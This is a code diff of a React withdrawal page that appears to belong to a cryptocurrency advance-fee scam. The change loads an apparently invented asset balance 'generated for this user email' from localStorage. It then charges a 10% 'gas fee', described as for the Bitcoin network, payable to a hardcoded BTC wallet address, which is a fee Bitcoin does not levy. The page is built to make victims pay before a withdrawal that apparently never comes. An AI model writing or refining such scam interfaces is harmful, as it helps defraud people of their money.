@@ -4,7 +4,7 @@ import { GlassCard } from "@/components/ui/GlassCard";
 import { Button } from "@/components/ui/button";
 import { Link, useLocation } from "wouter";
 import { ArrowLeft, Copy, AlertCircle } from "lucide-react";
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import walletQr from "@/assets/images/wallet-qr.png";
 
 const BTC_WALLET = "bc1qedjgpmpa69922x2pzqgyfp0nxf20wxvwzl2qvk";
@@ -12,11 +12,18 @@ const BTC_WALLET = "bc1qedjgpmpa69922x2pzqgyfp0nxf20wxvwzl2qvk";
 export default function Withdraw() {
   const [, setLocation] = useLocation();
   const [copied, setCopied] = useState(false);
+  const [assets, setAssets] = useState(125450);
 
-  // Example total assets (would come from dashboard state in real app)
-  const totalAssets = 125450;
-  const gasFee = (totalAssets * 0.10).toFixed(2);
-  const amountAfterFee = (totalAssets - parseFloat(gasFee)).toFixed(2);
+  useEffect(() => {
+    // Read the exact assets value generated for this user email from dashboard
+    const storedAssets = localStorage.getItem('dashboard_assets');
+    if (storedAssets) {
+      setAssets(parseInt(storedAssets));
+    }
+  }, []);
+
+  const gasFee = (assets * 0.10).toFixed(2);
+  const amountAfterFee = (assets - parseFloat(gasFee)).toFixed(2);
 
   const handleCopy = () => {
     navigator.clipboard.writeText(BTC_WALLET);
@@ -49,17 +56,17 @@ export default function Withdraw() {
             <div className="space-y-4 bg-black/20 p-6 rounded-lg border border-white/5 mb-8">
               <div className="flex justify-between items-center pb-4 border-b border-white/10">
                 <span className="text-muted-foreground">Total Assets</span>
-                <span className="text-xl font-bold">${totalAssets.toLocaleString()}</span>
+                <span className="text-xl font-bold">${assets.toLocaleString()}.00</span>
               </div>
               
               <div className="flex justify-between items-center pb-4 border-b border-white/10">
                 <span className="text-muted-foreground">Gas Fee (10% - Bitcoin Network)</span>
-                <span className="text-lg font-bold text-red-400">-${gasFee}</span>
+                <span className="text-lg font-bold text-red-400">-${parseFloat(gasFee).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</span>
               </div>
               
               <div className="flex justify-between items-center pt-2">
                 <span className="text-lg font-bold text-white">Amount to Receive</span>
-                <span className="text-2xl font-bold text-green-400">${amountAfterFee}</span>
+                <span className="text-2xl font-bold text-green-400">${parseFloat(amountAfterFee).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</span>
               </div>
             </div>
 
